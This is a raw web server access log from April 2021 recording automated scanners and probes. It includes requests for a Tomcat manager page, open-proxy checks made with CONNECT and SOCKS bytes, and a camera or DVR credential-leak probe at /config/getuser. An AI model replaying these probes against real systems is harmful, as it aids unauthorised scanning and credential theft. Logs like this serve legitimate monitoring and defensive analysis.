18.220.116.237 - - [02/Apr/2021:22:46:55 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xB4\xEE\xDF\x0C\xFB\xDD\xAE#xB\xA7?r\xFE4\x01\x17HS)\xFE\xAE^]\x9C\xD5{\x1B\x10z[\xF1 \xF4\xB9\xB5\xF1\xE9&\x11K\x86\x99\x0C\xB0\xDDY\x18\xBE\x15D\x01\xB1Gq\x9B\xD2\xB4M\xE9)x\xD0\xCEm\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-"
139.162.111.98 - - [02/Apr/2021:23:15:34 +0000] "GET / HTTP/1.1" 404 2601 "-" "HTTP Banner Detection (https://security.ipip.net)"
209.17.96.242 - - [02/Apr/2021:23:15:51 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
192.241.224.216 - - [02/Apr/2021:23:25:26 +0000] "\x16\x03\x01\x00\x89\x01\x00\x00\x85\x03\x03\xF9\xB3\xC9\xF4\x83\xA1\x0E\x95\xC1\xDDF\xD4\xD5\x22\xDA*\x84\x0E\x9E\xC6^\x0E2\xD9\xEE\x17\x16\xDFV\x18\xE2" 400 157 "-" "-"
85.119.151.254 - - [02/Apr/2021:23:51:40 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBPUNXMNVEKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.2.80 Yowser/2.5 Safari/537.36"
85.119.151.254 - - [02/Apr/2021:23:51:45 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.253 - - [02/Apr/2021:23:51:50 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.254 - - [02/Apr/2021:23:51:55 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.253 - - [02/Apr/2021:23:52:15 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPEIEMDONVEKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
85.119.151.254 - - [02/Apr/2021:23:52:20 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [02/Apr/2021:23:52:25 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.254 - - [02/Apr/2021:23:52:30 +0000] "\x05\x01\x00" 400 157 "-" "-"
170.130.187.54 - - [03/Apr/2021:00:13:48 +0000] "GET / HTTP/1.0" 404 2599 "-" "https://gdnplus.com:Gather Analyze Provide."
209.141.62.143 - - [03/Apr/2021:00:48:57 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
35.80.34.187 - - [03/Apr/2021:00:57:42 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
34.86.35.12 - - [03/Apr/2021:01:12:44 +0000] "GET / HTTP/1.1" 404 2602 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.23.159.29 - - [03/Apr/2021:01:46:05 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [03/Apr/2021:02:11:29 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [03/Apr/2021:02:34:54 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
85.119.151.253 - - [03/Apr/2021:02:51:29 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIIUNJTJIEKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.2.80 Yowser/2.5 Safari/537.36"
85.119.151.252 - - [03/Apr/2021:02:51:34 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.250 - - [03/Apr/2021:02:51:39 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.251 - - [03/Apr/2021:02:51:44 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.254 - - [03/Apr/2021:02:52:59 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXOUUNPJIEKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.119.151.251 - - [03/Apr/2021:02:53:04 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.250 - - [03/Apr/2021:02:53:09 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.252 - - [03/Apr/2021:02:53:14 +0000] "\x05\x01\x00" 400 157 "-" "-"
40.113.42.86 - - [03/Apr/2021:03:53:25 +0000] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
205.185.122.102 - - [03/Apr/2021:03:59:57 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.143 - - [03/Apr/2021:04:00:08 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
59.24.148.231 - - [03/Apr/2021:04:01:12 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xECB\x89\x06#]G\xC7`J\x18\x10" 400 157 "-" "-"
59.24.148.231 - - [03/Apr/2021:04:01:12 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x8B}\xE6\xBCZ_\xB4\xE5\xFF\x95&\x04@@[\xF1\x95\x92\xEB\xE5\xC1\xB3\x9E\x91\x1C\x92\xC1\xA9d" 400 157 "-" "-"
59.24.148.231 - - [03/Apr/2021:04:01:12 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03]\xE9)d\xB6\x9B\xAE\x89\xCE\x80\xE9\x9D|~A\xBA5!\xE0,A\xC8U\x87[\x00\x00f\xD1\xA7;\xF2 _\xC0\x8FLK\xA5\x02=\x19#\x92F5;BO\xF0\xF9F\xAE?\x053\xFF^\x0B\x01\x01o\xF2\xE0Q\x00\x22\xEA\xEA\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x00" 400 157 "-" "-"
59.24.148.231 - - [03/Apr/2021:04:01:12 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03}\x0B\xF1dXm\x9A\xFDv\xB7\xE8\x0E\xFB[6x3\xC7" 400 157 "-" "-"
